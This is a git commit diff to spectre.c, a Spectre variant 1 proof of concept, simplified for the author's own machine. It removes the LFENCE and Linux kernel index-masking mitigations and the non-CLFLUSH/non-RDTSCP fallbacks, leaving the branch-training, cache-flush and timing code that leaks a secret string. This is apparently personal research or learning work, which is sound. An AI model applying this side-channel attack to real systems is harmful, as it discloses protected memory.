3940be1462eecaf34df161adc2d7deb9b87ccd40
Yusuke Uchida <fantomyuu0623@gmail.com>
2022-12-18 20:03:07 +0900

    spectre.c: simplified for my own computer

--- spectre.c
+++ spectre.c
@@ -66,49 +66,12 @@ uint8_t array1[16] = {
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char * secret = "The Magic Words are Squeamish Ossifrage.";
+char * secret = "Spectre Exploit Done, Enable Mitigation!";
 
 uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
 
-#ifdef LINUX_KERNEL_MITIGATION
-/* From https://github.com/torvalds/linux/blob/cb6416592bc2a8b731dabcec0d63cda270764fc6/arch/x86/include/asm/barrier.h#L27 */
-/**
- * array_index_mask_nospec() - generate a mask that is ~0UL when the
- * 	bounds check succeeds and 0 otherwise
- * @index: array element index
- * @size: number of elements in array
- *
- * Returns:
- *     0 - (index < size)
- */
-static inline unsigned long array_index_mask_nospec(unsigned long index,
-		unsigned long size)
-{
-	unsigned long mask;
-
-	__asm__ __volatile__ ("cmp %1,%2; sbb %0,%0;"
-			:"=r" (mask)
-			:"g"(size),"r" (index)
-			:"cc");
-	return mask;
-}
-#endif
-
 void victim_function(size_t x) {
   if (x < array1_size) {
-#ifdef INTEL_MITIGATION
-		/*
-		 * According to Intel et al, the best way to mitigate this is to 
-		 * add a serializing instruction after the boundary check to force
-		 * the retirement of previous instructions before proceeding to 
-		 * the read.
-		 * See https://newsroom.intel.com/wp-content/uploads/sites/11/2018/01/Intel-Analysis-of-Speculative-Execution-Side-Channels.pdf
-		 */
-		_mm_lfence();
-#endif
-#ifdef LINUX_KERNEL_MITIGATION
-    x &= array_index_mask_nospec(x, array1_size);
-#endif
     temp &= array2[array1[x] * 512];
   }
 }
@@ -117,25 +80,6 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
-#ifdef NOCLFLUSH
-#define CACHE_FLUSH_ITERATIONS 2048
-#define CACHE_FLUSH_STRIDE 4096
-uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
-
-/* Flush memory using long SSE instructions */
-void flush_memory_sse(uint8_t * addr)
-{
-  float * p = (float *)addr;
-  float c = 0.f;
-  __m128 i = _mm_setr_ps(c, c, c, c);
-
-  int k, l;
-  /* Non-sequential memory addressing by looping through k by l */
-  for (k = 0; k < 4; k++)
-    for (l = 0; l < 4; l++)
-      _mm_stream_ps(&p[(l * 4 + k) * 4], i);
-}
-#endif
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -146,42 +90,18 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
   register uint64_t time1, time2;
   volatile uint8_t * addr;
 
-#ifdef NOCLFLUSH
-  int junk2 = 0;
-  int l;
-  (void)junk2;
-#endif
-
   for (i = 0; i < 256; i++)
     results[i] = 0;
   for (tries = 999; tries > 0; tries--) {
 
-#ifndef NOCLFLUSH
     /* Flush array2[512*(0..255)] from cache */
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
-#else
-    /* Flush array2[256*(0..255)] from cache
-       using long SSE instruction several times */
-    for (j = 0; j < 16; j++)
-      for (i = 0; i < 256; i++)
-        flush_memory_sse( & array2[i * 512]);
-#endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
     for (j = 29; j >= 0; j--) {
-#ifndef NOCLFLUSH
       _mm_clflush( & array1_size);
-#else
-      /* Alternative to using clflush to flush the CPU cache */
-      /* Read addresses at 4096-byte intervals out of a large array.
-         Do this around 2000 times, or more depending on CPU cache size. */
-
-      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
-        junk2 = cache_flush_array[l];
-      } 
-#endif
 
       /* Delay (can also mfence) */
       for (volatile int z = 0; z < 100; z++) {}
@@ -211,47 +131,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     processor ticks, and is also serialized.
     */
 
-#ifndef NORDTSCP
       time1 = __rdtscp( & junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#else
 
-    /*
-    The rdtscp instruction was instroduced with the x86-64 extensions.
-    Many older 32-bit processors won't support this, so we need to use
-    the equivalent but non-serialized tdtsc instruction instead.
-    */
-
-#ifndef NOMFENCE
-      /*
-      Since the rdstc instruction isn't serialized, newer processors will try to
-      reorder it, ruining its value as a timing mechanism.
-      To get around this, we use the mfence instruction to introduce a memory
-      barrier and force serialization. mfence is used because it is portable across
-      Intel and AMD.
-      */
-
-      _mm_mfence();
-      time1 = __rdtsc(); /* READ TIMER */
-      _mm_mfence();
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      _mm_mfence();
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-      _mm_mfence();
-#else
-      /*
-      The mfence instruction was introduced with the SSE2 instruction set, so
-      we have to ifdef it out on pre-SSE2 processors.
-      Luckily, these older processors don't seem to reorder the rdtsc instruction,
-      so not having mfence on older processors is less of an issue.
-      */
-
-      time1 = __rdtsc(); /* READ TIMER */
-      junk = * addr; /* MEMORY ACCESS TO TIME */
-      time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-#endif
-#endif
       if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
@@ -298,12 +181,6 @@ int main(int argc,
   uint8_t value[2];
   int i;
 
-  #ifdef NOCLFLUSH
-  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
-    cache_flush_array[i] = 1;
-  }
-  #endif
-  
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   }
@@ -339,26 +216,22 @@ int main(int argc,
     printf("RDTSCP_SUPPORTED ");
   #else
     printf("RDTSCP_NOT_SUPPORTED ");
+    printf("\nWill exit");
+    return (-1);
   #endif
   #ifndef NOMFENCE
     printf("MFENCE_SUPPORTED ");
   #else
     printf("MFENCE_NOT_SUPPORTED ");
+    printf("\nWill exit");
+    return (-1);
   #endif
   #ifndef NOCLFLUSH
     printf("CLFLUSH_SUPPORTED ");
   #else
     printf("CLFLUSH_NOT_SUPPORTED ");
-  #endif
-  #ifdef INTEL_MITIGATION
-    printf("INTEL_MITIGATION_ENABLED ");
-  #else
-    printf("INTEL_MITIGATION_DISABLED ");
-  #endif
-  #ifdef LINUX_KERNEL_MITIGATION
-    printf("LINUX_KERNEL_MITIGATION_ENABLED ");
-  #else
-    printf("LINUX_KERNEL_MITIGATION_DISABLED ");
+    printf("\nWill exit");
+    return (-1);
   #endif
 
   printf("\n");
